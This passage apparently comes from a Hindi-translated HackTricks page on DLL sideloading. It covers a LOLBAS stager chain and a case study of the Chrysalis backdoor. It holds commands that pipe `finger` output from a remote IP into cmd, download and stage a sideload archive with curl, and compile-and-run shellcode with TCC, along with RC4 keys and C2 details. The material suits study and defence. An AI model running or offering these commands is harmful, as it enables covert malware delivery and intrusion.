* चूंकि executable trusted बनी रहती है, अधिकांश allowlisting controls को सामान्यतः केवल आपके malicious DLL का उसके साथ होना ही चाहिए। loader DLL को अनुकूलित करने पर ध्यान दें; signed parent प्रायः बिना परिवर्तन के चल सकती है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के बगल में मौजूद हो और writable हो ताकि mapping के बाद फ़ाइल को zero किया जा सके। payload लोड होने तक डायरेक्टरी writable रखें; एक बार memory में होने पर TMP फ़ाइल OPSEC के लिए सुरक्षित रूप से डिलीट की जा सकती है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ जोड़ते हैं ताकि disk पर केवल malicious DLL ही कस्टम आर्टिफ़ैक्ट रहे, और trusted EXE के बगल में रखा जाए:

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` spawn करता है, Finger server से commands खींचता है, और उन्हें `cmd` को pipe करता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 पर text खींचता है; `| cmd` सर्वर रिस्पॉन्स को execute कर देता है, जिससे operators second-stage server-side बदल सकते हैं।

- **Built-in download/extract:** एक archive को benign extension के साथ डाउनलोड करें, उसे अनपैक करें, और sideload target + DLL को किसी random `%LocalAppData%` फ़ोल्डर में stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छुपाता है और redirects को follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के माध्यम से स्टार्ट करें ताकि telemetry में एक CIM-created process दिखे जबकि वह colocated DLL लोड करता है:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन बाइनरीज़ के साथ काम करता है जो local DLLs को प्राथमिकता देती हैं (उदा., `intelbq.exe`, `nearby_share.exe`); payload (उदा., Remcos) trusted नाम के तहत चलता है।

- **Hunting:** `/p`, `/m`, और `/c` एक साथ दिखाई देने पर `forfiles` पर alert करें; admin scripts के बाहर यह असामान्य होता है।

## केस स्टडी: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

एक हालिया Lotus Blossom intrusion ने trusted update chain का दुरुपयोग करके NSIS-packed dropper भेजा जिसने DLL sideload और पूरी तरह in-memory payloads स्टेज किए।

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** Mark करता है, एक renamed Bitdefender Submission Wizard `BluetoothService.exe`, एक malicious `log.dll`, और एक encrypted blob `BluetoothService` ड्रॉप करता है, फिर EXE लॉन्च करता है।
- Host EXE `log.dll` को import करता है और `LogInit`/`LogWrite` को कॉल करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material पिछले hash से निकला हुआ) से decrypt करता है, buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उस पर jump करता है।
- IAT से बचने के लिए loader export नामों को hash करके APIs resolve करता है उपयोग करते हुए **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करके salted target hashes से तुलना करता है।

मुख्य shellcode (Chrysalis)
- एक PE-जैसी main module को decrypt करता है add/XOR/sub को key `gQ2JR&9;` के साथ पांच पास दोहराकर, फिर import resolution खत्म करने के लिए dynamically `Kernel32.dll` → `GetProcAddress` लोड करता है।
- रनटाइम में DLL नाम strings को per-character bit-rotate/XOR transforms के माध्यम से reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` लोड करता है।
- दूसरा resolver उपयोग करता है जो **PEB → InMemoryOrderModuleList** को वॉक करता है, प्रत्येक export table को 4-बाइट ब्लॉकों में Murmur-style mixing से पार्स करता है, और केवल तब `GetProcAddress` पर fallback करता है जब hash न मिले।

Embedded configuration & C2
- Config ड्रॉप किए गए `BluetoothService` फ़ाइल के अंदर **offset 0x30808** पर रहता है (size **0x980**) और इसे key `qwhvb^435h&*7` से RC4-decrypt किया जाता है, जिससे C2 URL और User-Agent प्रकट होते हैं।
- Beacons एक dot-delimited host profile बनाते हैं, tag `4Q` prepend करते हैं, फिर `vAuig34%^325hGV` key से RC4-encrypt करके HTTPS पर `HttpSendRequestA` के जरिए भेजते हैं। Responses RC4-decrypt होते हैं और tag switch द्वारा dispatch होते हैं (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से gated है: कोई args नहीं = persistence install (service/Run key) pointing to `-i`; `-i` self को `-k` के साथ relaunch करता है; `-k` install skip करके payload चलाता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler ड्रॉप किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसके बगल में `libtcc.dll` था। हमलावर द्वारा सप्लाई किया गया C source embedded shellcode था, जिसे compile करके in-memory चलाया गया बिना PE डिस्क पर छोड़े। Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- यह TCC-आधारित compile-and-run stage ने runtime पर `Wininet.dll` को import किया और एक hardcoded URL से second-stage shellcode को खींचा, जिससे एक लचीला loader बनता है जो एक compiler run के रूप में छुपता है।

## संदर्भ

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
